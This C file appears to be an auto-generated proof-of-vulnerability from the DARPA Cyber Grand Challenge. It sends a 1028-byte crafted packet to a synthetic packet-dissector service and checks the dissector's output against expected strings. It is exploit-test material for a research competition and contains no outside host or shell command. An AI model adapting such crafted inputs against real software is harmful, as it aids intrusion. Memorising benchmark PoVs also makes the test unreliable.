#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x15\x58\x10\x6b"
         "\xf6\x5a\x64\x69\x9a\x5d\xdd\xd4\xe8\xff\x17\x30\x05\x2d\x22\x15"
         "\x6d\x01\x00\x00\x3c\x23\x24\x8b\x6e\x50\x62\x89\x2d\xd9\xaa\x20"
         "\x2f\xe2\x6c\xb4\x11\x23\x5b\xf0\x1b\x58\x86\xfd\x5b\x7f\xfd\xe0"
         "\x45\x36\x75\x4f\x72\x33\xcb\x57\x27\xfa\x59\x4e\xa6\xfb\xad\x25"
         "\x28\xe7\x5b\x7b\xa5\x25\x14\xe3\xac\x46\x9a\xc9\x07\x8e\x06\x9a"
         "\x52\x42\xdc\x82\xde\xf8\x43\x27\x39\x96\x46\x72\x17\x46\x74\x45"
         "\xbc\x90\x00\x08\x04\x50\x73\xc6\xcc\xd9\x0d\x4f\x89\xfb\x58\xca"
         "\x1f\x0d\xf7\x14\x88\x76\xc2\x07\x20\x7a\x9d\xc2\xd9\xe4\x3c\x51"
         "\xe2\x25\xff\x19\x6d\x35\xd6\x80\xae\xb1\x0e\xe4\xc8\x0f\xaa\xc0"
         "\x55\x9b\x07\x26\x1e\x59\xb2\x6b\xba\x87\x49\xe8\x55\xd1\x35\x4f"
         "\xdc\x72\x03\x52\xbe\x1e\x74\x73\xa7\xd2\xc2\xee\x37\xbf\xa2\x1b"
         "\xa3\x71\x75\x80\xa5\xc3\x89\xa1\x5e\xb0\x6c\x13\x6f\x0e\xd9\x02"
         "\xbf\x3d\x4e\x54\x9e\x79\x12\xb5\x7d\x6c\xb8\x7b\x3c\x2c\x1c\x32"
         "\xd3\x97\xdf\x42\xad\x15\xf5\x43\x44\x64\x9b\xfb\xea\x61\x12\x35"
         "\x5f\xf5\xf7\xcc\xa6\x75\xd6\xbe\x77\xbb\x8c\x0e\xc4\xbd\x6b\x7d"
         "\x47\x9c\x58\x02\x52\x0a\x47\xba\x81\x22\x13\xeb\xd3\x36\x8c\x0d"
         "\xcf\x03\xde\x63\x97\xbb\xf3\x00\x9a\x85\xfd\xf3\x34\xc8\xdd\xc7"
         "\xfe\xde\xf0\x00\xa3\x1e\xe1\xf4\xac\x1a\xf7\x80\x1b\x4d\x13\x25"
         "\xec\x79\xc2\xee\xe1\x30\x98\x3b\x2b\xb0\xe9\x22\x11\x98\xfb\x52"
         "\xf9\x26\x18\x00\x24\xb8\x9a\x36\x41\xa1\x18\x34\x0a\xf7\xbd\xb7"
         "\x3d\x34\x43\xe5\x41\x6f\x50\xdb\x8d\xfb\x5f\xcf\x0b\xd0\x7c\xd1"
         "\x6c\x3d\xfc\x58\x2a\x36\x15\x59\x0b\x1a\xec\x06\xd9\x13\x9b\x01"
         "\xc1\x06\x5e\x96\x63\x42\xb5\x12\x92\x08\xf9\x7f\x05\xc5\x33\x73"
         "\x05\x49\xeb\x20\xb3\xc1\x4e\xeb\x73\x41\x6d\x0f\x9c\xe6\xdc\xdf"
         "\x9d\x86\x16\x17\x1f\x7e\xb8\xd8\x7e\x93\x72\xf1\x65\xad\x89\x95"
         "\xc7\xd2\x35\x57\xd8\x3c\x34\x7c\x91\xb5\x46\x3a\x8b\xd2\xae\x8c"
         "\x8e\x18\xab\x4f\xe1\xb4\x6d\x16\x47\x22\x87\xe8\x86\xba\x70\xa5"
         "\xd5\x8f\x72\xec\x3e\x6e\x69\x42\xed\xac\xde\xa5\xf8\x85\xb2\x30"
         "\xec\x70\x60\xd1\x92\xf9\xec\xfc\x04\xf2\xdb\x2d\x61\x3b\xbf\xf6"
         "\x5a\xf5\xb8\xfa\xf7\xb9\x57\x8f\x3c\xae\x36\x86\xf6\xdc\xec\xcb"
         "\x5a\x0c\x48\x8b\xe8\x95\xc3\xdc\x1c\x3c\x00\x65\x0b\x1f\x24\x01"
         "\x82\x94\x26\x75\xc3\x95\xf9\x3c\x00\x02\xf0\xcf\x9f\x1b\x6c\x13"
         "\x37\xf5\x4c\x00\xae\xb7\x65\x57\xbc\xc5\x3c\x00\x6c\x07\x22\x6e"
         "\xe3\x7a\x49\x2b\x05\xca\xef\x7d\xa3\x7b\xac\x4f\x8c\xb5\x33\x7d"
         "\x37\x16\xc9\xc3\xd5\xa7\x15\xc6\x3d\x60\x41\x0f\x48\xab\x39\xbf"
         "\x9c\xbf\xe5\x2e\x5c\xe9\x62\x5b\xcd\xa7\x10\x27\x75\x27\x6b\x11"
         "\x08\x57\x08\x24\x18\xfc\xd8\xa0\xf2\x91\xa9\x37\x3b\x17\x43\x7d"
         "\x51\x6f\x90\xd3\x6b\xb3\x57\x0c\xcc\x1b\x55\x65\x0b\xb0\x38\x3e"
         "\x59\xbf\x37\x6f\xa1\x7b\xaf\xa0\x3c\x00\x68\x34\x3d\x64\x3c\x14"
         "\x7e\x1f\x10\x04\x3b\xc4\xfd\x3a\x7a\x56\x42\x5c\xa9\x7b\x2d\xf3"
         "\xd1\x0c\xc7\x6f\x8f\x0f\x09\x49\xf8\x74\x4d\x72\x1f\x3d\x4f\xf4"
         "\xfc\xf0\xa1\xe4\xac\x81\xcf\xc4\x9d\xd2\xc3\x64\x4b\x3a\xf8\x76"
         "\x18\x37\xd3\xb2\x29\x7c\x00\x14\x27\xa2\x0f\x6a\x8d\x1a\x7e\x5a"
         "\xf0\xcf\x60\x3f\xec\xd6\xcc\x53\x68\x6a\x2e\x54\x7a\xdc\xf1\xb7"
         "\x19\x2d\x65\xaa\x47\x09\x5e\x7f\xfa\xaf\x8d\xbf\x41\x89\xe8\xbb"
         "\x55\x87\x0c\x42\x32\xf6\x77\x1d\x3e\xe0\xa1\xb4\x0e\xc0\x17\x55"
         "\xab\x9e\x13\xed\x25\x52\x56\x9f\xf1\xb4\x5e\xb6\xda\x5e\xde\x03"
         "\x48\x0d\x1f\xc0\x60\x0b\x60\x3c\x00\x46\x72\x50\x39\x05\xba\x63"
         "\xdd\x7f\x1d\xce\x18\x3d\xcb\xed\x43\x92\x31\x5d\xbc\x2b\x1c\x64"
         "\x8b\x8c\xfe\x16\x7f\xa6\x5d\xdc\xf9\x57\x96\x33\xd9\xfa\x0a\x76"
         "\xe6\x75\xea\x4f\xd1\xcc\x7d\x27\xdf\xe6\xd8\x0e\x25\x98\x89\x47"
         "\xcd\x6d\x2a\x74\x41\xe4\x07\xdf\x0b\x8d\xf4\x3c\x23\x48\x82\xf7"
         "\x6b\xff\x60\x85\xa1\x8d\xc9\x5e\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===exempttanninlike
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x65\x78\x65\x6d\x70\x74\x74\x61\x6e\x6e\x69"
         "\x6e\x6c\x69\x6b\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
